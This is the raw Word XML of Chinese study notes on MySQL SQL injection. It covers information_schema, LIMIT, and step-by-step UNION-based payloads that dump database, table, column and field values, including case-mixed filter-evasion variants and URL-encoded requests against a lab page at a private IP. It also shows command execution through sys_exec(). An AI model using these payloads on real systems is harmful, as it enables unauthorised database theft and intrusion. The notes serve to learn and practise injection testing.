        <w:t>Information_schema</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF7040">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>数据库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该数据库包含了重要信息</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00CF704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SCHEMATA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>”表，用于存储数据库名，其中的关键字段为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>SCHEMA_NAME,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>表示数据库名称。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00CF704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TABLES</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>”表，用于存储表明。其中关键字段</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>TABLE_SCHEMA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>表示表所属的数据库名称；关键字段</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>TABLE_NAME</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>表示表的名称。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00CF7040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”</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>COLUMNS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>“表，用于存储字段名。其中的关键字段</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>TABLE_SCHEMA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>表示表所属的数据库名称；字段</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>TABLE_NAME</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>表示所属的表的名称；</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>COLUMN_NAME</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>表示字段名。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRPr="00CF7040" w:rsidRDefault="00912F6A" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r w:rsidRPr="00CF7040">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>LIMIT</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF7040">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>子句查询指定数据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 w:rsidR="00CF7040">
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>limit</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>自居可以被用于强制</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>select</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>语句返回指定的记录数，用法如下：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="00CF7040">
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>SELECT * FROM table LIMIT [offset,] rows|rows OFFSET offset</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00CF7040">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>limit</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>可以接受</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>个或</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>个参数。如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数表明返回记录行的最大数目。初始记录行偏移是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912F6A" w:rsidRDefault="00912F6A" w:rsidP="00CF7040">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>SELECT * FROM table LIMIT 0,1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该句可检索记录行中的第一条数据内容</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRPr="00CF7040" w:rsidRDefault="00912F6A" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r w:rsidRPr="00CF7040">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>手动注入，暴库：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005124D8" w:rsidRDefault="005124D8" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="49"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>获取</w:t>
      </w:r>
      <w:r>
        <w:t>当前用户</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005124D8" w:rsidRPr="005124D8" w:rsidRDefault="005124D8" w:rsidP="005124D8">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:r w:rsidRPr="005124D8">
        <w:t>Select user()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>测试字段数目：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>order by 1/2/3/4...n</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF7040" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:hyperlink r:id="rId7" w:history="1">
        <w:r w:rsidR="00CF7040" w:rsidRPr="00164E28">
          <w:rPr>
            <w:rStyle w:val="a4"/>
          </w:rPr>
          <w:t>http://172.24.178.143/sqli/example2.php?name=root'/**/order/**/by/**/1#</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00C75434" w:rsidP="00CF7040">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:hyperlink r:id="rId8" w:history="1">
        <w:r w:rsidR="00CF7040" w:rsidRPr="00164E28">
          <w:rPr>
            <w:rStyle w:val="a4"/>
          </w:rPr>
          <w:t>http://172.24.178.143/sqli/example2.php?name=root%27%2f%2a%2a%2forder%</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00912F6A">
        <w:t>2f%2a%2a%2fby%2f%2a%2a%2f1%23</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>检测页面返回的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>column</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>列</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00CF7040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union select 1,2,3,4#</w:t>
      </w:r>
      <w:r w:rsidR="00912F6A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>显示几就说明第几列</w:t>
      </w:r>
      <w:r w:rsidR="00912F6A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>column</w:t>
      </w:r>
      <w:r w:rsidR="00912F6A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>被显示在页面上了</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRPr="00D06CEC" w:rsidRDefault="00912F6A" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D06CEC">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>爆所有数据库名</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF7040" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:ind w:firstLineChars="0"/>
      </w:pPr>
      <w:r>
        <w:t>and 1=2 union select 1,group_concat(SCHEMA_NAME),3,4 from information_schema.schemata</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF7040" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:ind w:firstLineChars="0"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">aNd 1=2 uNion SelEct 1,2,gRoUp_coNcAt(SCHEMA_NAME),4,5  fRom </w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>infoRmation_schema.schemata#</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF7040" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:ind w:firstLineChars="0"/>
      </w:pPr>
      <w:r>
        <w:t>and 1=2 union select 1,group_concat(distinct(table_schema)),3,4 from information_schema.columns</w:t>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A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(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>当前数据库名</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>) union select database()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>爆当前数据库所有表</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="000322A3">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
        <w:ind w:firstLineChars="0"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">and 1=2 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()  </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF7040" w:rsidRDefault="00912F6A" w:rsidP="000322A3">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
        <w:ind w:firstLineChars="0"/>
      </w:pPr>
      <w:r>
        <w:t>and 1=2 union select 1,group_concat(distinct(table_name)) from information_schema.columns where table_schema='xxx'</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="000322A3">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
        <w:ind w:firstLineChars="0"/>
      </w:pPr>
      <w:r>
        <w:t>aNd 1=2 uNion SelEct 1,2,gRoUp_coNcAt(distinct(table_name)),4,5  fRom infoRmation_schema.columns where table_schema='news'#</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>爆表中的字段名</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="000322A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and 1=2 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>表名的十六进制编码</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="000322A3">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:ind w:firstLineChars="0"/>
      </w:pPr>
      <w:r>
        <w:t>and 1=2 union select 1,group_concat(distinct(column_name)) from information_schema.columns where table_name='xxx'</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>爆指定字段值</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00CF7040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12F6A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>and 1=2 union select 1,group_concat(</w:t>
      </w:r>
      <w:r w:rsidR="00912F6A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>字段</w:t>
      </w:r>
      <w:r w:rsidR="00912F6A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>1,0x7c,</w:t>
      </w:r>
      <w:r w:rsidR="00912F6A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>字段名</w:t>
      </w:r>
      <w:r w:rsidR="00912F6A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">2),3,4 from </w:t>
      </w:r>
      <w:r w:rsidR="00912F6A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>表名</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>执行系统命令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linux</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>系统下通过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>system</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>执行系统命令</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>mysql&gt; system xxxx;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mysql</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>自带</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>sys_eval()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>sys_exec()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>函数</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>mysql&gt; select sys_exec('xxx');</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AA39CC" w:rsidRDefault="00AA39CC" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:t>常用函数</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AA39CC" w:rsidRPr="00AA39CC" w:rsidRDefault="00AA39CC" w:rsidP="00AA39CC">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0">
                <wp:extent cx="5286375" cy="1404620"/>
                <wp:effectExtent l="0" t="0" r="28575" b="1778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6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当前数据库名</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00AA39CC">
                              <w:rPr>
                                <w:rFonts w:hint="eastAsia"/>
                              </w:rPr>
                              <w:t>: database() schema()(5.0.2</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00AA39CC">
                              <w:rPr>
                                <w:rFonts w:hint="eastAsia"/>
                              </w:rPr>
                              <w:t>后</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00AA39CC"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数据库版本</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00AA39CC">
                              <w:rPr>
                                <w:rFonts w:hint="eastAsia"/>
                              </w:rPr>
                              <w:t>: version() @@version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数据库用户</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00AA39CC">
                              <w:rPr>
                                <w:rFonts w:hint="eastAsia"/>
                              </w:rPr>
                              <w:t>: user() current_user() session_user() system_user()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tab/>
                              <w:t xml:space="preserve">length() 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tab/>
                              <w:t>ascii(‘A’) ord(65)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tab/>
                              <w:t>char(77, 121, 83, 81, 76)---MySQL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 xml:space="preserve">upper() lower() </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00AA39CC">
                              <w:rPr>
                                <w:rFonts w:hint="eastAsia"/>
                              </w:rPr>
                              <w:t>大小写转换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>substring(str, pos, len) pos</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00AA39CC">
                              <w:rPr>
                                <w:rFonts w:hint="eastAsia"/>
                              </w:rPr>
                              <w:t>从</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00AA39CC">
                              <w:rPr>
                                <w:rFonts w:hint="eastAsia"/>
                              </w:rPr>
                              <w:t>1</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00AA39CC">
                              <w:rPr>
                                <w:rFonts w:hint="eastAsia"/>
                              </w:rPr>
                              <w:t>开始</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00AA39C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AA39CC">
                              <w:rPr>
                                <w:rFonts w:hint="eastAsia"/>
                              </w:rPr>
                              <w:t>取子字符串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 xml:space="preserve">left(string,pos) right(string,pos) mid(string,pos,len) </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00AA39CC">
                              <w:rPr>
                                <w:rFonts w:hint="eastAsia"/>
                              </w:rPr>
                              <w:t>取子</w:t>
                            </w:r>
                          </w:p>
                          <w:p w:rsidR="00812AAA" w:rsidRPr="00AA39CC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</w:r>
                            <w:r w:rsidRPr="00AA39CC">
                              <w:rPr>
                                <w:rFonts w:hint="eastAsia"/>
                              </w:rPr>
                              <w:t>字符串</w:t>
                            </w:r>
                          </w:p>
                          <w:p w:rsidR="00812AAA" w:rsidRDefault="00812AAA" w:rsidP="00AA39CC">
                            <w:r w:rsidRPr="00AA39CC">
                              <w:rPr>
                                <w:rFonts w:hint="eastAsia"/>
                              </w:rPr>
                              <w:tab/>
                              <w:t>concat(string1,string2,</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00AA39CC">
                              <w:rPr>
                                <w:rFonts w:hint="eastAsia"/>
                              </w:rPr>
                              <w:t>…</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00AA39CC">
                              <w:rPr>
                                <w:rFonts w:hint="eastAsia"/>
                              </w:rPr>
                              <w:t xml:space="preserve">) </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00AA39CC">
                              <w:rPr>
                                <w:rFonts w:hint="eastAsia"/>
                              </w:rPr>
                              <w:t>字符串连接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16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">
                <v:textbox style="mso-fit-shape-to-text:t">
                  <w:txbxContent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当前数据库名</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00AA39CC">
                        <w:rPr>
                          <w:rFonts w:hint="eastAsia"/>
                        </w:rPr>
                        <w:t>: database() schema()(5.0.2</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00AA39CC">
                        <w:rPr>
                          <w:rFonts w:hint="eastAsia"/>
                        </w:rPr>
                        <w:t>后</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00AA39CC">
                        <w:rPr>
                          <w:rFonts w:hint="eastAsia"/>
                        </w:rPr>
                        <w:t>)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数据库版本</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00AA39CC">
                        <w:rPr>
                          <w:rFonts w:hint="eastAsia"/>
                        </w:rPr>
                        <w:t>: version() @@version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数据库用户</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00AA39CC">
                        <w:rPr>
                          <w:rFonts w:hint="eastAsia"/>
                        </w:rPr>
                        <w:t>: user() current_user() session_user() system_user()</w:t>
                      </w:r>
                    </w:p>
                    <w:p w:rsidR="00812AAA" w:rsidRPr="00AA39CC" w:rsidRDefault="00812AAA" w:rsidP="00AA39CC">
                      <w:r w:rsidRPr="00AA39CC">
                        <w:tab/>
                        <w:t xml:space="preserve">length() </w:t>
                      </w:r>
                    </w:p>
                    <w:p w:rsidR="00812AAA" w:rsidRPr="00AA39CC" w:rsidRDefault="00812AAA" w:rsidP="00AA39CC">
                      <w:r w:rsidRPr="00AA39CC">
                        <w:tab/>
                        <w:t>ascii(‘A’) ord(65)</w:t>
                      </w:r>
                    </w:p>
                    <w:p w:rsidR="00812AAA" w:rsidRPr="00AA39CC" w:rsidRDefault="00812AAA" w:rsidP="00AA39CC">
                      <w:r w:rsidRPr="00AA39CC">
                        <w:tab/>
                        <w:t>char(77, 121, 83, 81, 76)---MySQL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  <w:t xml:space="preserve">upper() lower() </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00AA39CC">
                        <w:rPr>
                          <w:rFonts w:hint="eastAsia"/>
                        </w:rPr>
                        <w:t>大小写转换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  <w:t>substring(str, pos, len) pos</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00AA39CC">
                        <w:rPr>
                          <w:rFonts w:hint="eastAsia"/>
                        </w:rPr>
                        <w:t>从</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00AA39CC">
                        <w:rPr>
                          <w:rFonts w:hint="eastAsia"/>
                        </w:rPr>
                        <w:t>1</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00AA39CC">
                        <w:rPr>
                          <w:rFonts w:hint="eastAsia"/>
                        </w:rPr>
                        <w:t>开始</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00AA39CC">
                        <w:rPr>
                          <w:rFonts w:hint="eastAsia"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00AA39CC">
                        <w:rPr>
                          <w:rFonts w:hint="eastAsia"/>
                        </w:rPr>
                        <w:t>取子字符串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  <w:t xml:space="preserve">left(string,pos) right(string,pos) mid(string,pos,len) </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00AA39CC">
                        <w:rPr>
                          <w:rFonts w:hint="eastAsia"/>
                        </w:rPr>
                        <w:t>取子</w:t>
                      </w:r>
                    </w:p>
                    <w:p w:rsidR="00812AAA" w:rsidRPr="00AA39CC" w:rsidRDefault="00812AAA" w:rsidP="00AA39CC">
                      <w:r w:rsidRPr="00AA39CC">
                        <w:rPr>
                          <w:rFonts w:hint="eastAsia"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00AA39CC">
                        <w:rPr>
                          <w:rFonts w:hint="eastAsia"/>
                        </w:rPr>
                        <w:t>字符串</w:t>
                      </w:r>
                    </w:p>
                    <w:p w:rsidR="00812AAA" w:rsidRDefault="00812AAA" w:rsidP="00AA39CC">
                      <w:r w:rsidRPr="00AA39CC">
                        <w:rPr>
                          <w:rFonts w:hint="eastAsia"/>
                        </w:rPr>
                        <w:tab/>
                        <w:t>concat(string1,string2,</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00AA39CC">
                        <w:rPr>
                          <w:rFonts w:hint="eastAsia"/>
                        </w:rPr>
                        <w:t>…</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00AA39CC">
                        <w:rPr>
                          <w:rFonts w:hint="eastAsia"/>
                        </w:rPr>
                        <w:t xml:space="preserve">) </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00AA39CC">
                        <w:rPr>
                          <w:rFonts w:hint="eastAsia"/>
                        </w:rPr>
                        <w:t>字符串连接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3223F" w:rsidRDefault="0043223F" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:t>PHP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>中</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>Mysql</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>相关</w:t>
      </w:r>
      <w:r>
        <w:t>变量和函数</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0043223F" w:rsidRDefault="0043223F" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>untime</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>配置</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0043223F" w:rsidRDefault="0043223F" w:rsidP="0043223F">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F9F9F9"/>
        <w:spacing w:before="18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MySQL </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>函数的行为受到</w:t>
      </w:r>
      <w:r>
